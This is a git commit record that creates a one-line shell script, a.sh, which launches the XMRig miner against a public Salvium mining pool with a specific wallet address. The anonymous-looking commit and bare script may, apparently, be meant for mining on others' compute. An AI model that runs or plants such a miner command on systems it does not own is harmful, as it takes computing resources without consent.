a7fdd11e2ae15872272b993ee39e291e54b3227c
menju2ikg8uti <menju2ikg8uti@kolabnow.com>
2026-02-26 11:45:05 +0700

    Create a.sh

---
+++ a.sh
@@ -0,0 +1,1 @@
+./xmrig -a rx/0 -k --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk=260000.net_
